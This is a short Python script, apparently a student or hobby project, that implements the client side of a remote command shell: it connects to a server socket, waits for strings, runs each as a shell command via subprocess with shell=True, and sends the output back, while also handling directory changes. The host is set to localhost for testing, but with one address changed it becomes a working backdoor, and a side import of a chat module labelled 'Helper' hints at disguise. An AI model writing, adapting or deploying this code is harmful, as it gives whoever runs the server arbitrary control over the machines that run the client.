import  socket , sys , os
import subprocess , threading , talk 

class clinet :
    # constructor 
    def __init__(self,server_add,server_port):
        self.s=socket.socket()
        self.host='127.0.0.1'    # own this is for testing
        self.port=12345 # to the port where request will be sent same as server.py
    # building connection with the server 
    
    
    def connect_socket(self):
        try :
            self.s.connect((self.host,self.port))
            print("connected to the server successfully .")
            talk.chat.start(self.s,'Helper')
            self.send_request()
        except socket.error as msg :
            print("failed to connect to "+ self.host)
            sys.exit(1)
    #communicating with the server 
    
    
    def send_request(self):
        while True :
            self.s.send(str.encode(os.getcwd() + ">"))
            data=self.s.recv(1024)
            print("Command received : " + data[:    ].decode("utf-8"))
            if data[:2].decode("utf-8")=="cd" :
                os.chdir(data[3:].decode("utf-8"))
                self.s.send(str.encode("Directory changed"))
            elif len(data)>0 :
                result= subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
                output_byte= result.stdout.read() + result.stderr.read()
                output_str= str(output_byte,"utf-8") #printing the result in the cliebnt computer
                #there may be a case to enter password 
                if len( output_str ) > 0 :
                    self.s.send(str.encode(output_str)) #sending op with the currnet working fdirectorty
                    print(output_str)
                else :
                    self.s.send(str.encode("Command Executed"))
                    print("Executed")

    

def main():
    c1=clinet("dont know",12345)
    c1.connect_socket()

main()



